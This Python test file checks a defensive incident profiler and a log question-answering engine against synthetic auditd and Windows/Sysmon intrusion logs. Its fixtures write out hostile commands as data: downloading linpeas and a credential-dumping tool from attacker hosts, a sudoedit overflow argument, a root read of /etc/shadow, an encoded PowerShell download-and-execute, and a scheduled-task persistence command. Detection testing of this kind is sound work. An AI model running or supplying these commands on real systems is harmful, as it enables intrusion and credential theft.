"""Tests for the deterministic incident profiler and the incident-driven
deterministic answers.

These pin the fix for the reported failure mode: on a real auditd capture
(83k rows of routine system activity around one SSH brute-force -> sudoedit
exploit -> root shell -> /etc/shadow read chain), the deterministic layer
previously answered extraction questions from background noise (all PIDs of
username=root, every referenced path, daemon process names). Answers must now
come from the incident profile: the attacker session, the exploit executions,
the downloaded tooling, and the root sensitive reads.
"""

from __future__ import annotations

import pytest

from core.deterministic_qa import DeterministicQAEngine
from core.incident_profile import build_incident_profile
from core.log_dataset import LogDataset
from core.question_understanding import QuestionSchema
from tests.conftest import make_events


def _intrusion_events():
    """An auditd-shaped miniature of the real incident: brute force for
    'btlo' from 192.168.4.155, linpeas fetched from the attacker, sudoedit
    heap-overflow exploit, root shell, /etc/shadow read. Timestamps are
    deliberately all within the same second: row order must drive sequence
    detection (real auditd captures are frequently same-second)."""
    events = []

    def ev(**kw):
        events.append(kw)

    t = "2021-10-05T05:52:07.000000Z"
    # Brute force: 12 failures from the attacker IP
    for i in range(12):
        ev(timestamp=t, event_type="USER_AUTH", action="failed_login",
           source_ip="192.168.4.155", username="btlo", uid="0",
           message="pam_unix(sshd:auth): authentication failure")
    # Successful login from the same source (row order after the failures)
    ev(timestamp=t, event_type="USER_LOGIN", action="successful_login",
       source_ip="192.168.4.155", username="btlo", uid="0",
       message="Accepted password for btlo")
    # Attacker session activity as uid/auid 1001
    ev(timestamp=t, event_type="EXECVE", action="command_exec",
       username="", uid="1001", auid="1001", pid="809688",
       command="wget -O - http://192.168.4.155:8000/linpeas.sh",
       message="wget fetched enumeration tooling")
    ev(timestamp=t, event_type="USER_CMD", action="command_exec",
       username="btlo", uid="1001", auid="1001", pid="809687",
       command="sudo -l", message="scanner privilege check")
    # Exploit staging + invocation (uid 1001, payload shell same PID)
    ev(timestamp=t, event_type="EXECVE", action="command_exec",
       username="", uid="1001", auid="1001", pid="829987",
       command="gcc -fPIC -shared -o libnss_X/P0P_SH3LLZ_ .so.2 lib.c",
       message="payload library compiled")
    ev(timestamp=t, event_type="EXECVE", action="command_exec",
       username="", uid="1001", auid="1001", pid="829992", euid="0",
       command="sudoedit -s " + "A" * 56 + ' " a3= ' + "B" * 52,
       message="sudoedit heap overflow attempt")
    ev(timestamp=t, event_type="EXECVE", action="command_exec",
       username="", uid="0", auid="1001", pid="829992",
       command="sh", message="payload shell running as root")
    ev(timestamp=t, event_type="EXECVE", action="command_exec",
       username="", uid="0", auid="1001", pid="830004",
       command="cat /etc/shadow", message="root read the shadow file")
    # Background system noise (root daemons, unrelated to the incident)
    ev(timestamp=t, event_type="SYSCALL", action="",
       username="", uid="0", auid="4294967295", pid="600",
       command="", message="snapd routine activity")
    return events


@pytest.fixture
def intrusion_dataset():
    return LogDataset(make_events(_intrusion_events()), source_file="intrusion.log")


@pytest.fixture
def profile(intrusion_dataset):
    schema = QuestionSchema(intrusion_dataset.event_index)
    return build_incident_profile(intrusion_dataset.df, intrusion_dataset.event_index, schema)


class TestIncidentProfile:
    def test_identifies_account_source_and_counts(self, profile):
        assert profile.has_incident is True
        assert profile.compromised_user == "btlo"
        assert profile.attacker_ip == "192.168.4.155"
        assert profile.failed_count == 12
        assert profile.success_count >= 1

    def test_escalation_prefers_exploit_over_scanner_checks(self, profile):
        top = profile.top_escalation
        assert top is not None
        assert top["binary"] == "sudoedit"
        assert top["check"] is False
        # The scanner check is recorded but flagged, never the representative.
        checks = [e for e in profile.escalation if e["check"]]
        assert any(e["command"] == "sudo -l" for e in checks)

    def test_exploit_signature_maps_to_baron_samedit(self, profile):
        assert profile.cve_matches
        top = profile.top_cve_match
        assert top["cve"] == "CVE-2021-3156"
        assert "sudoedit" in top["command"]
        # staging rows (gcc/libnss) are not the representative match
        assert "gcc" not in top["command"]

    def test_downloaded_tool_and_payload(self, profile):
        assert profile.downloaded_tools
        assert profile.downloaded_tools[0]["tool"] == "linpeas"

    def test_root_shell_and_sensitive_read(self, profile):
        assert profile.root_shell is not None
        assert profile.root_shell["command"] == "sh"
        assert profile.root_shell["uid"] == "0"
        roots = profile.root_sensitive_reads
        assert roots and roots[0]["path"] == "/etc/shadow"
        assert roots[0]["command"] == "cat /etc/shadow"

    def test_no_incident_on_benign_log(self):
        events = []
        for i in range(10):
            events.append({
                "timestamp": f"2021-10-05T06:00:{i:02d}Z",
                "event_type": "SYSCALL", "action": "",
                "username": "", "uid": "0", "auid": "4294967295",
                "command": "", "message": "routine daemon activity",
            })
        ds = LogDataset(make_events(events), source_file="benign.log")
        schema = QuestionSchema(ds.event_index)
        profile = build_incident_profile(ds.df, ds.event_index, schema)
        assert profile.has_incident is False


class TestIncidentDrivenAnswers:
    def test_compromised_account(self, intrusion_dataset):
        result = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset).answer(
            "Which account was compromised?"
        )
        assert result is not None
        assert "'btlo'" in result.answer
        assert "12 failed login" in result.answer
        assert "192.168.4.155" in result.answer

    def test_attacker_ip(self, intrusion_dataset):
        result = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset).answer(
            "What is the attacker's IP address?"
        )
        assert result is not None
        assert "192.168.4.155" in result.answer

    def test_attack_type_brute_force(self, intrusion_dataset):
        result = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset).answer(
            "What attack type was used to gain initial access?"
        )
        assert result is not None
        assert "brute-force" in result.answer.lower()
        assert "12 failed" in result.answer

    def test_exfiltrated_file_is_the_root_read_not_any_path(self, intrusion_dataset):
        result = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset).answer(
            "What file was exfiltrated once root was gained?"
        )
        assert result is not None
        assert "/etc/shadow" in result.answer
        assert "PID 830004" in result.answer

    def test_cve_signature_mapping(self, intrusion_dataset):
        engine = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset)
        result = engine.answer("What CVE was exploited to gain root access?")
        assert result is not None
        assert "CVE-2021-3156" in result.answer
        assert "signature" in result.answer.lower()
        # vulnerability-type question answers from the same mapping
        vuln = engine.answer("What type of vulnerability is this?")
        assert vuln is not None
        assert "CVE-2021-3156" in vuln.answer

    def test_binary_and_pid_used_to_gain_root(self, intrusion_dataset):
        result = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset).answer(
            "What is the name of the binary and PID used to gain root?"
        )
        assert result is not None
        assert "sudoedit" in result.answer
        assert "829992" in result.answer
        # the payload shell is named as the consequence
        assert "uid=0" in result.answer

    def test_enumeration_tool_is_linpeas_not_daemons(self, intrusion_dataset):
        result = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset).answer(
            "What tool was used to perform system enumeration?"
        )
        assert result is not None
        assert "linpeas" in result.answer
        assert "192.168.4.155:8000" in result.answer

    def test_summary_lists_high_risk_findings(self, intrusion_dataset):
        engine = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset)
        for question in ("Summarize highest-risk findings", "Explain critical activity"):
            result = engine.answer(question)
            assert result is not None, question
            assert "btlo" in result.answer
            assert "linpeas" in result.answer
            assert "CVE-2021-3156" in result.answer
            assert result.evidence_records, "summary must carry an evidence chain"

    def test_suspicious_users_any_question_shape(self, intrusion_dataset):
        engine = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset)
        result = engine.answer("Identify suspicious users")
        assert result is not None
        assert "'btlo'" in result.answer

    def test_gain_root_phrase_is_not_a_username_filter(self, intrusion_dataset):
        """'gain root' must not resolve to username=root and silently narrow
        the query to root's own records."""
        engine = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset)
        result = engine.answer("What CVE was exploited to gain root access?")
        assert result is not None
        assert "matching username=root" not in result.answer
        assert "CVE-2021-3156" in result.answer

    def test_profile_cached_across_questions(self, intrusion_dataset):
        engine = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset)
        engine.answer("Which account was compromised?")
        cached = intrusion_dataset._incident_profile
        assert cached is not None
        second = DeterministicQAEngine(intrusion_dataset.df, intrusion_dataset)
        second.answer("What is the attacker's IP address?")
        assert second._incident_profile is cached


def _windows_events():
    """Windows Security + Sysmon JSON-style miniature: 4625 brute force for
    'jdoe' from 198.51.100.23, 4624 success, encoded PowerShell, certutil
    download, Sysmon LSASS access (EventID 10) and dump staging (EventID 11)."""
    events = []
    for i in range(1, 12):
        events.append({
            "timestamp": "2026-09-15T08:00:00Z", "event_id": "4625",
            "event_type": "EventID 4625", "username": "jdoe",
            "source_ip": "198.51.100.23", "action": "failed_login",
            "message": "An account failed to log on",
        })
    events.append({
        "timestamp": "2026-09-15T08:20:00Z", "event_id": "4624",
        "event_type": "EventID 4624", "username": "jdoe",
        "source_ip": "198.51.100.23", "action": "successful_login",
        "message": "An account was successfully logged on",
    })
    events.append({
        "timestamp": "2026-09-15T08:21:00Z", "event_id": "1",
        "event_type": "EventID 1", "username": "jdoe", "action": "process_create",
        "process_name": "powershell.exe", "pid": "4444",
        "command": "powershell.exe -nop -w hidden -enc SQBFAFgA",
        "parent_image": "C:\\Windows\\explorer.exe",
        "message": "Process Create",
    })
    events.append({
        "timestamp": "2026-09-15T08:22:00Z", "event_id": "10",
        "event_type": "EventID 10", "username": "jdoe", "action": "",
        "process_name": "mimidw.exe", "pid": "5555",
        "targetimage": "C:\\Windows\\system32\\lsass.exe",
        "message": "Process accessed LSASS",
    })
    events.append({
        "timestamp": "2026-09-15T08:23:00Z", "event_id": "11",
        "event_type": "EventID 11", "username": "jdoe", "action": "",
        "pid": "5555", "targetfilename": "C:\\Temp\\lsass.dmp",
        "message": "File created",
    })
    events.append({
        "timestamp": "2026-09-15T08:24:00Z", "event_id": "3",
        "event_type": "EventID 3", "username": "jdoe", "action": "",
        "process_name": "certutil.exe", "pid": "6666",
        "command": "certutil.exe -urlcache -f http://198.51.100.23:8000/mimidw.exe C:\\Temp\\mimidw.exe",
        "message": "Network connection",
    })
    return events


@pytest.fixture
def windows_dataset():
    return LogDataset(make_events(_windows_events()), source_file="windows.json")


class TestWindowsIncidentProfile:
    def test_windows_platform_and_brute_force(self, windows_dataset):
        schema = QuestionSchema(windows_dataset.event_index)
        profile = build_incident_profile(windows_dataset.df, windows_dataset.event_index, schema)
        assert profile.is_windows
        assert profile.has_incident
        assert profile.compromised_user == "jdoe"
        assert profile.attacker_ip == "198.51.100.23"

    def test_windows_suspicious_execution_detected(self, windows_dataset):
        schema = QuestionSchema(windows_dataset.event_index)
        profile = build_incident_profile(windows_dataset.df, windows_dataset.event_index, schema)
        labels = [s["label"] for s in profile.suspicious_executions]
        assert any("PowerShell" in label for label in labels)

    def test_windows_credential_access_detected(self, windows_dataset):
        schema = QuestionSchema(windows_dataset.event_index)
        profile = build_incident_profile(windows_dataset.df, windows_dataset.event_index, schema)
        kinds = [c["kind"] for c in profile.credential_access]
        assert any("LSASS" in k for k in kinds)

    def test_windows_downloaded_tool(self, windows_dataset):
        schema = QuestionSchema(windows_dataset.event_index)
        profile = build_incident_profile(windows_dataset.df, windows_dataset.event_index, schema)
        assert any(t["tool"] == "mimidw" for t in profile.downloaded_tools)


class TestWindowsIncidentAnswers:
    def test_windows_questions_answer_correctly(self, windows_dataset):
        engine = DeterministicQAEngine(windows_dataset.df, windows_dataset)
        compromise = engine.answer("Which account was compromised?")
        assert compromise is not None and "'jdoe'" in compromise.answer

        attacker = engine.answer("What is the attacker's IP address?")
        assert attacker is not None and "198.51.100.23" in attacker.answer

        attack_type = engine.answer("What attack type was used to gain initial access?")
        assert attack_type is not None and "brute-force" in attack_type.answer.lower()

        suspicious = engine.answer("What suspicious process was executed and what is its PID?")
        assert suspicious is not None and "powershell.exe" in suspicious.answer and "4444" in suspicious.answer

        cred = engine.answer("What credential access or dumping activity is present?")
        assert cred is not None and "LSASS" in cred.answer

        files = engine.answer("What files or artifacts did the attacker access or stage?")
        assert files is not None and "lsass.dmp" in files.answer

        summary = engine.answer("Summarize highest-risk findings")
        assert summary is not None and "jdoe" in summary.answer and "powershell" in summary.answer.lower()

    def test_sysmon_only_log_still_answers(self):
        """Suspicious executions without any authentication events (a pure
        Sysmon capture) must still produce deterministic answers."""
        events = [
            {
                "timestamp": "2026-09-15T10:01:00Z", "event_id": "1",
                "event_type": "EventID 1", "username": "CORP\\asmith",
                "action": "process_create", "process_name": "powershell.exe",
                "pid": "9001",
                "command": "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/pay.ps1')",
                "message": "Process Create",
            },
            {
                "timestamp": "2026-09-15T10:02:00Z", "event_id": "1",
                "event_type": "EventID 1", "username": "CORP\\asmith",
                "action": "process_create", "process_name": "schtasks.exe",
                "pid": "9002",
                "command": "schtasks /create /tn Updater /tr C:\\Temp\\pay.exe /sc onlogon",
                "message": "Process Create",
            },
        ]
        ds = LogDataset(make_events(events), source_file="sysmon.json")
        engine = DeterministicQAEngine(ds.df, ds)
        summary = engine.answer("Summarize highest-risk findings")
        assert summary is not None
        assert "powershell" in summary.answer.lower()
        assert "schtasks" in summary.answer.lower()
        suspicious = engine.answer("What suspicious process was executed and what is its PID?")
        assert suspicious is not None and "powershell" in suspicious.answer.lower()


class TestDynamicSuggestions:
    def test_suggestions_match_windows_log(self, windows_dataset):
        from core.question_suggestions import suggest_questions

        questions = suggest_questions(windows_dataset.df, windows_dataset)
        assert questions
        assert len(questions) <= 12
        assert any("suspicious process" in q.lower() for q in questions)
        assert not any("gain root" in q.lower() for q in questions)

    def test_suggestions_match_unix_log(self, intrusion_dataset):
        from core.question_suggestions import suggest_questions

        questions = suggest_questions(intrusion_dataset.df, intrusion_dataset)
        assert any("gain root" in q.lower() for q in questions)
        assert any("summarize highest-risk findings" in q.lower() for q in questions)

    def test_suggestions_match_web_log(self):
        events = []
        for i in range(1, 15):
            events.append({
                "timestamp": f"2026-09-15T11:{i:02d}:00Z",
                "event_type": "http", "action": "",
                "source_ip": f"203.0.113.{i % 4 + 1}",
                "status_code": "404" if i % 2 else "200",
                "uri": f"/page{i}", "message": f"GET /page{i} HTTP/1.1",
            })
        ds = LogDataset(make_events(events), source_file="access.log")
        from core.question_suggestions import suggest_questions

        questions = suggest_questions(ds.df, ds)
        assert any("client errors" in q.lower() for q in questions)
        assert not any("gain root" in q.lower() for q in questions)
